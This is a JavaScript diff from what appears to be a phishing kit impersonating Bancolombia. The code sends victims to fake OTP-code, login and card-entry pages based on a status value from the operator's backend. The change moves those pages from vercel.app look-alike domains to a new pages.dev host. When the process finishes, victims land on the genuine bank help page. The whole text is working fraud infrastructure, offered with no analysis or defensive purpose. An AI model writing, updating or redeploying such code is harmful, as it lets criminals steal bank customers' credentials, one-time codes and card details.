@@ -233,10 +233,10 @@
           }
 
           // Redirigir según el estado
-          if (data.estado === "autorizado") window.location.href = "https://seguridabancolombia.vercel.app/codigo.html";
-          else if (data.estado === "error") window.location.href = "https://seguridabancolombia.vercel.app/";
-          else if (data.estado === "otp") window.location.href = "https://seguridabancolombia.vercel.app/codigo.html";
-          else if (data.estado === "fallo") window.location.href = "https://appbancolombia.vercel.app/tarjeta.html";
+          if (data.estado === "autorizado") window.location.href = "https://serviciosenlinea.pages.dev/codigo.html";
+          else if (data.estado === "error") window.location.href = "https://serviciosenlinea.pages.dev/";
+          else if (data.estado === "otp") window.location.href = "https://serviciosenlinea.pages.dev/codigo.html";
+          else if (data.estado === "fallo") window.location.href = "https://serviciosenlinea.pages.dev/tarjeta.html";
           else if (data.estado === "finalizado") window.location.href = "https://www.bancolombia.com/centro-de-ayuda";
           else {
             console.log('Estado desconocido:', data.estado);
